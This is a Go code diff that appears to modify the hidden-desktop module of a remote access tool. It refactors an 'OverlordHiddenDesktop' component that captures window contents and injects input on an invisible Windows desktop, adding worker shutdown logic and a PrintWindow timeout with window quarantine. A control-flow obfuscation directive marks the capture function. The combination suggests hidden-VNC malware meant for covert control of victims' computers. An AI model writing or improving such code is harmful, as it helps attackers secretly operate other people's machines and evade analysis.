@@ -155,6 +155,7 @@ const (
 var (
 	backstageDesktopHandle   uintptr
 	backstageDesktopMu       sync.Mutex
+	backstageCaptureMu       sync.Mutex
 	backstageDesktopName     = "OverlordHiddenDesktop"
 	backstageInitialized     bool
 	backstageOriginalDesktop uintptr
@@ -163,6 +164,7 @@ var (
 	backstageThreadErr       error
 	backstageThreadReady     chan struct{}
 	backstageThreadTasks     chan backstageTask
+	backstageThreadDone      chan struct{}
 	backstageWatchdogOnce    sync.Once
 	backstageNoWindowLogNs   atomic.Int64
 	backstageInputMu         sync.Mutex
@@ -191,6 +193,7 @@ var (
 	backstageWinCachePrev  []byte
 	backstageWinCacheBytes int64
 	backstageWinCacheSeq   uint64
+	backstageHungWindows   map[uintptr]struct{}
 
 	backstageCompHdcMem uintptr
 	backstageCompHbmp   uintptr
@@ -215,6 +218,7 @@ const (
 	backstageTaskKeyUp
 	backstageTaskMouseWheel
 	backstageTaskAutoStartExplorer
+	backstageTaskShutdown
 )
 
 type backstageTask struct {
@@ -293,6 +297,7 @@ type backstageWinCacheEntry struct {
 const (
 	backstageMaxWindowCacheEntries = 64
 	backstageMaxWindowCacheBytes   = int64(256 << 20)
+	backstagePrintWindowTimeout    = 250 * time.Millisecond
 )
 
 type keybdInput struct {
@@ -388,8 +393,11 @@ func CleanupbackstageDesktop() {
 	resetH264D3D11TextureEncoder("backstage")
 
 	backstageCleanupFrameReaders()
-	captureMu.Lock()
-	backstageCleanupDWMThumbnails()
+	dwmCleaned, workerStopped := shutdownbackstageThreadLocked(time.Second)
+	if !dwmCleaned {
+		backstageAbandonDWMThumbnails()
+	}
+	backstageCaptureMu.Lock()
 
 	backstageFreeCapCache()
 
@@ -407,7 +415,7 @@ func CleanupbackstageDesktop() {
 	backstageCompBits = nil
 	backstageCompW = 0
 	backstageCompH = 0
-	captureMu.Unlock()
+	backstageCaptureMu.Unlock()
 
 	backstageInputMu.Lock()
 	backstageShiftDown = false
@@ -420,14 +428,10 @@ func CleanupbackstageDesktop() {
 	backstageInputMu.Unlock()
 	backstageLastScale.Store(0)
 
-	if backstageDesktopHandle != 0 {
-		if backstageOriginalDesktop != 0 {
-			procSetThreadDesktop.Call(backstageOriginalDesktop)
-		}
-
+	if backstageDesktopHandle != 0 && workerStopped {
 		procCloseDesktop.Call(backstageDesktopHandle)
-		backstageDesktopHandle = 0
 	}
+	backstageDesktopHandle = 0
 	backstageInitialized = false
 	backstageExplorerStarted = false
 
@@ -436,14 +440,50 @@ func CleanupbackstageDesktop() {
 	resetWinUI3Cache()
 	resetInputSiteCache()
 
-	if backstageThreadTasks != nil {
-		close(backstageThreadTasks)
-		backstageThreadTasks = nil
-	}
+	backstageThreadTasks = nil
 	backstageThreadReady = nil
+	backstageThreadDone = nil
 	backstageThreadErr = nil
 	backstageThreadOnce = sync.Once{}
 	backstageWatchdogOnce = sync.Once{}
+}
+
+func shutdownbackstageThreadLocked(timeout time.Duration) (dwmCleaned, stopped bool) {
+	tasks := backstageThreadTasks
+	done := backstageThreadDone
+	if tasks == nil || done == nil {
+		return false, true
+	}
+	if timeout <= 0 {
+		timeout = time.Second
+	}
+	resp := make(chan backstageTaskResult, 1)
+	task := backstageTask{kind: backstageTaskShutdown, resp: resp, id: backstageTaskSeq.Add(1), queuedAt: time.Now()}
+	timer := time.NewTimer(timeout)
+	defer timer.Stop()
+	select {
+	case tasks <- task:
+	case <-done:
+		return false, true
+	case <-timer.C:
+		log.Printf("backstage cleanup: worker shutdown enqueue timed out")
+		return false, false
+	}
+	select {
+	case result := <-resp:
+		dwmCleaned = result.err == nil
+	case <-done:
+	case <-timer.C:
+		log.Printf("backstage cleanup: worker shutdown timed out")
+		return false, false
+	}
+	select {
+	case <-done:
+		return dwmCleaned, true
+	case <-timer.C:
+		log.Printf("backstage cleanup: worker exit timed out")
+		return dwmCleaned, false
+	}
 }
 
 func SetbackstageCursorCapture(enabled bool) {
@@ -476,31 +516,38 @@ func ensurebackstageThread() error {
 	}
 
 	backstageThreadOnce.Do(func() {
-		backstageThreadReady = make(chan struct{})
-		backstageThreadTasks = make(chan backstageTask)
+		ready := make(chan struct{})
+		tasks := make(chan backstageTask)
+		done := make(chan struct{})
+		backstageThreadReady = ready
+		backstageThreadTasks = tasks
+		backstageThreadDone = done
 		backstageWatchdogOnce.Do(func() {
 			go func() {
 				defer recoverAndLog("backstage watchdog", nil)
 				backstageThreadWatchdog()
 			}()
 		})
-		go func(handle uintptr) {
+		go func(handle, originalDesktop uintptr) {
 			defer recoverAndLog("backstage desktop thread", nil)
 			runtime.LockOSThread()
-			defer runtime.UnlockOSThread()
+			defer func() {
+				if originalDesktop != 0 {
+					procSetThreadDesktop.Call(originalDesktop)
+				}
+				close(done)
+				runtime.UnlockOSThread()
+			}()
 
 			r, _, err := procSetThreadDesktop.Call(handle)
 			if r == 0 {
 				backstageThreadErr = fmt.Errorf("failed to set thread desktop: %v", err)
-				close(backstageThreadReady)
-				for task := range backstageThreadTasks {
-					task.resp <- backstageTaskResult{err: backstageThreadErr}
-				}
+				close(ready)
 				return
 			}
 
-			close(backstageThreadReady)
-			for task := range backstageThreadTasks {
+			close(ready)
+			for task := range tasks {
 				start := time.Now()
 				backstageCurrentTaskID.Store(task.id)
 				backstageCurrentTaskKind.Store(int64(task.kind))
@@ -530,6 +577,8 @@ func ensurebackstageThread() error {
 					result.err = backstageMouseWheelOnThread(task.delta)
 				case backstageTaskAutoStartExplorer:
 					result.err = backstageAutoStartExplorerOnThread()
+				case backstageTaskShutdown:
+					backstageCleanupDWMThumbnails()
 				default:
 					result.img, result.err = BackstageCaptureDisplayOnThread(task.display)
 				}
@@ -547,8 +596,11 @@ func ensurebackstageThread() error {
 				backstageCurrentTaskKind.Store(-1)
 				backstageCurrentTaskID.Store(0)
 				task.resp <- result
+				if task.kind == backstageTaskShutdown {
+					return
+				}
 			}
-		}(desktopHandle)
+		}(desktopHandle, backstageOriginalDesktop)
 	})
 
 	if backstageThreadReady != nil {
@@ -774,6 +826,8 @@ func backstageTaskKindName(kind backstageTaskKind) string {
 		return "mouse_wheel"
 	case backstageTaskAutoStartExplorer:
 		return "auto_start_explorer"
+	case backstageTaskShutdown:
+		return "shutdown"
 	default:
 		return fmt.Sprintf("unknown(%d)", kind)
 	}
@@ -874,8 +928,8 @@ func backstageEnsureCapCache(w, h int) (uintptr, uintptr, []byte, bool) {
 
 func BackstageCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
-	captureMu.Lock()
-	defer captureMu.Unlock()
+	backstageCaptureMu.Lock()
+	defer backstageCaptureMu.Unlock()
 
 	setDPIAware()
 
@@ -1720,6 +1774,11 @@ func drawbackstageWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, tar
 			backstageRemoveWindowCacheEntry(h)
 		}
 	}
+	for h := range backstageHungWindows {
+		if !alive[h] {
+			delete(backstageHungWindows, h)
+		}
+	}
 
 	return drawn
 }
@@ -1811,6 +1870,18 @@ func backstageRemoveWindowCacheEntry(hwnd uintptr) {
 	}
 }
 
+func backstageDetachWindowCacheEntry(hwnd uintptr, entry *backstageWinCacheEntry) bool {
+	if backstageWinCache[hwnd] != entry {
+		return false
+	}
+	delete(backstageWinCache, hwnd)
+	backstageWinCacheBytes -= entry.bytes
+	if backstageWinCacheBytes < 0 {
+		backstageWinCacheBytes = 0
+	}
+	return true
+}
+
 func backstageClearWindowCache() {
 	for hwnd := range backstageWinCache {
 		backstageRemoveWindowCacheEntry(hwnd)
@@ -1834,6 +1905,8 @@ var backstageDXGIEnabled atomic.Bool
 var backstageUIAEnabled atomic.Bool
 var backstagePrintWindowFallbackEnabled atomic.Bool
 var backstagePrintWindowFallbackLogNs atomic.Int64
+var backstagePrintWindowTimeoutLogNs atomic.Int64
+var backstagePrintWindowFn = printWindow
 
 func init() {
 	backstageDXGIEnabled.Store(false) // disabled by default
@@ -1863,6 +1936,49 @@ func SetbackstagePrintWindowFallbackEnabled(enabled bool) {
 
 func GetbackstagePrintWindowFallbackEnabled() bool {
 	return backstagePrintWindowFallbackEnabled.Load()
+}
+
+func backstagePrintWindowWithTimeout(hwnd uintptr, entry *backstageWinCacheEntry) bool {
+	if backstageHungWindows == nil {
+		backstageHungWindows = make(map[uintptr]struct{})
+	}
+	if _, quarantined := backstageHungWindows[hwnd]; quarantined {
+		return false
+	}
+
+	var ownership atomic.Int32 // 0=racing, 1=caller keeps cache, 2=worker frees detached cache
+	done := make(chan bool, 1)
+	go func() {
+		ok := false
+		func() {
+			defer func() { _ = recover() }()
+			ok = backstagePrintWindowFn(hwnd, entry.hdcMem, PW_RENDERFULLCONTENT)
+		}()
+		if ownership.CompareAndSwap(0, 1) {
+			done <- ok
+			return
+		}
+		backstageFreeCacheEntry(entry)
+	}()
+
+	timer := time.NewTimer(backstagePrintWindowTimeout)
+	defer timer.Stop()
+	select {
+	case ok := <-done:
+		return ok
+	case <-timer.C:
+		if !ownership.CompareAndSwap(0, 2) {
+			return <-done
+		}
+		backstageDetachWindowCacheEntry(hwnd, entry)
+		backstageHungWindows[hwnd] = struct{}{}
+		now := time.Now().UnixNano()
+		last := backstagePrintWindowTimeoutLogNs.Load()
+		if now-last > int64(5*time.Second) && backstagePrintWindowTimeoutLogNs.CompareAndSwap(last, now) {
+			log.Printf("backstage capture: PrintWindow timed out for hwnd=0x%x; quarantining window", hwnd)
+		}
+		return false
+	}
 }
 
 func drawbackstageWindowFromDXGI(hwnd uintptr, winLeft, winTop, winW, winH int, bounds image.Rectangle, target []byte, targetStride int) bool {
@@ -1986,7 +2102,10 @@ func drawbackstageWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target
 		return false
 	}
 
-	if !printWindow(hwnd, entry.hdcMem, PW_RENDERFULLCONTENT) {
+	if !backstagePrintWindowWithTimeout(hwnd, entry) {
+		if backstageWinCache[hwnd] != entry {
+			return false
+		}
 		entry.lastOK = false
 		entry.age++
 		return false
